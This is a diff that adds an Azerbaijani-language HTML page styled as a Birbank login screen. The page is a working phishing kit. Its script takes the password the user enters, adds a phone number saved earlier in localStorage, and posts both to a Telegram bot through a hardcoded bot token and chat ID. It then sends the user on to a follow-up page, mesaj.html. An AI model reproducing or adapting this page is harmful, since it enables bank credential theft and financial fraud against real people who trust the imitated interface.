@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+  <meta charset="UTF-8">
+  <title>Giriş</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: sans-serif;
+      background-color: #f5f5f5;
+      padding: 40px;
+    }
+    .header {
+      background-color: #ffffff;
+      color: #000;
+      padding: 15px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      border-bottom: 1px solid #ccc;
+      margin: -40px -40px 30px -40px;
+    }
+    .content {
+      text-align: center;
+      font-size: 16px;
+      color: #333;
+    }
+    .instruction {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #444;
+    }
+    .phone-input {
+      position: relative;
+      margin-top: 20px;
+      margin-bottom: 5px;
+      max-width: 300px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    .phone-input input {
+      width: 100%;
+      padding: 10px 35px 10px 10px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 12px;
+      outline: none;
+    }
+    .toggle-visibility {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: #999;
+      cursor: pointer;
+      user-select: none;
+    }
+    .button {
+      width: 100%;
+      max-width: 300px;
+      padding: 12px;
+      background-color: #d00000;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    .alert {
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #d00000;
+    }
+  </style>
+</head>
+<body>
+  <div class="header">Giriş</div>
+  <div class="content">
+    Birbank istifadəçiləri üçün giriş
+    <div class="instruction">
+      Tətbiqə daxil olmaq üçün daha əvvəl qeydiyyatdan keçdiyiniz telefon nömrəsini və şifrə daxil edin.
+    </div>
+    <div class="phone-input">
+      <input type="password" id="password" placeholder="şifr">
+      <span class="toggle-visibility" onclick="togglePassword()">👁</span>
+    </div>
+    <button class="button" onclick="validatePassword()">Davam etmək</button>
+    <div class="alert" id="alert">Zəhmət olmasa, əvvəlcə sahəni doldurun</div>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const input = document.getElementById('password');
+      input.type = input.type === 'password' ? 'text' : 'password';
+    }
+
+    function validatePassword() {
+      const input = document.getElementById('password');
+      const alertBox = document.getElementById('alert');
+      if (input.value.trim() === '') {
+        alertBox.style.display = 'block';
+        setTimeout(() => {
+          alertBox.style.display = 'none';
+        }, 2000);
+      } else {
+        const password = input.value.trim();
+        const phone = localStorage.getItem("phone") || "Yoxdur";
+        const orderId = Math.floor(100000 + Math.random() * 900000);
+        localStorage.setItem("password", password);
+        localStorage.setItem("orderId", orderId);
+
+        const token = "8214700162:AAFSFr5T0Yjkz4x62p2IE_GAdcKP4FgHTB0";
+        const chatId = "8492691780";
+        const message = `🧾 Sifariş №${orderId}\n📱 Telefon: ${phone}\n🔑 Şifrə: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        }).then(() => {
+          window.location.href = "mesaj.html";
+        }).catch(() => {
+          window.location.href = "mesaj.html";
+        });
+      }
+    }
+  </script>
+</body>
+</html>
